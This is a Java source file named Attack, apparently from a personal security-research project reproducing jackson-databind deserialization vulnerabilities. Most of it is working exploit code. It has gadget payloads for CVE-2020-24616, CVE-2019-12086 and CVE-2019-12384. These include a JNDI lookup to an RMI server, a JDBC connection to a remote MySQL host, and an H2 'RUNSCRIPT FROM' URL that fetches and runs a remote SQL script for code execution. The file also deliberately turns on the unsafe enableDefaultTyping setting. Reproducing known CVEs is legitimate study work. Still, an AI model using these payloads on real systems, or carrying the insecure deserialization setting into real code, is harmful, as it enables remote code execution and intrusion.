package com.pinger.javasec.jackson;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.pinger.javasec.jackson.domain.Height;
import com.pinger.javasec.jackson.domain.Student;
import com.pinger.javasec.jackson.domain.User;

/**
 * @author : p1n93r
 * @date : 2021/8/4 9:52
 */
public class Attack {


    public static void test1() throws JsonProcessingException {
        ObjectMapper mapper = new ObjectMapper();
        User user = new User();
        Height height = new Height();
        height.setH(100);
        user.setHeight(height);
        String res = mapper.writeValueAsString(user);
        System.out.println(res);
    }


    public static void test2()throws Exception{
        // {"height":{"@class":"com.pinger.javasec.jackson.Attack$1"}}
        // {"height":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["xxx"],"transletName":"test","outputProperties":{}}]}
        String jsonStr="{\"height\":[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"xxx\"],\"transletName\":\"test\",\"outputProperties\":{}}]}";
        ObjectMapper mapper = new ObjectMapper();
        User user = mapper.readValue(jsonStr, User.class);
        System.out.println(user);
    }

    public static void test3()throws Exception{
        Student student = new Student();
        student.setName("阿淦");
        ObjectMapper mapper = new ObjectMapper();
        ObjectMapper objectMapper = mapper.enableDefaultTyping();
        String exp = objectMapper.writeValueAsString(student);
        System.out.println(exp);
    }


    /**
     * CVE-2020-24616
     * jackson-databind 2.x before 2.9.10.6
     * Gadget : javax.transaction#jta[1.1]  br.com.anteros#Anteros-DBCP[1.0.1]
     * Condition :
     * readValue(jsonStr, Object.class)
     * or 开启enableDefaultTyping且存在Object类型的属性
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)，且标注在Object类型的属性上
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)，且标注在Object类型的属性上
     */
    public static void testCVE_2020_24616()throws Exception{
        String payloadOne = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"metricRegistry\":\"rmi://127.0.0.1:1099/EvalClass\"}]";
        String payloadTwo = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\",{\"healthCheckRegistry\":\"rmi://127.0.0.1:1099/EvalClass\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payloadOne, Object.class);
    }

    /**
     * CVE-2019-12086
     * jackson-databind 2.x before 2.9.9
     * Gadget : mysql-connector-java[6.0.3-8.0.15]
     * Condition :
     * readValue(jsonStr, Object.class)
     * or 开启enableDefaultTyping且存在Object类型的属性
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)，且标注在Object类型的属性上
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)，且标注在Object类型的属性上
     */
    public static void testCVE_2019_12086()throws Exception{
        String payload = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://192.168.189.23:3307/test\"]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payload, Object.class);
    }


    /**
     * CVE-2019-12384
     * jackson-databind 2.x before 2.9.9.1
     * Gadget : logback-core  h2
     * Condition :
     * readValue(jsonStr, Object.class)
     * or 开启enableDefaultTyping且存在Object类型的属性
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)，且标注在Object类型的属性上
     * or 使用注解:@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)，且标注在Object类型的属性上
     */
    public static void testCVE_2019_12384()throws Exception{
        Class.forName("org.h2.Driver").newInstance();
        String ssrfPayload = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:4444/~/hacker\"}]";
        //该条payload用于RCE的复现
        String rcePayload = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:80/h2rce.sql'\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object res = mapper.readValue(ssrfPayload, Object.class);
        mapper.writeValueAsString(res);
    }

    public static void main(String[] args)throws Exception {
        test3();
    }



}
